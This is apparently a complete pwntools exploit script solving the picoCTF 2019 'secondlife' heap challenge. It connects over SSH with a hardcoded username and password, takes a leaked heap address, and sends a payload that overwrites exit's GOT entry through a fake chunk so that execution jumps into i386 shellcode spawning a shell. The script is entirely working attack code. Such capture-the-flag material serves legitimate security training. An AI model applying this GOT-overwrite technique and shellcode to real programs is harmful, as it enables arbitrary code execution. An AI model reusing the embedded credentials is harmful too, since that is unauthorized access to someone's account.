from pwn import *

context.binary = './vuln'

sh = ssh(host='2019shell1.picoctf.com', user='jamesyoung', password='pBCNtaNiAc7Fs&F')
server = sh.process('vuln', cwd='/problems/secondlife_4_5c2075e2c32bb7f481b1d866564b1f26')

print(server.recvline())
leak = int(server.recvline())

server.sendline('hello')

exit_got = 0x0804d02c

payload = p32(exit_got - 12) 
payload += p32(leak + 8)
payload += asm('''
  jmp sc
  {}
sc:
  nop
  '''.format('nop\n'*11) + shellcraft.i386.linux.sh())

payload = payload.ljust(256)
server.recvuntil('useful...\n')
server.sendline(payload)
server.interactive()
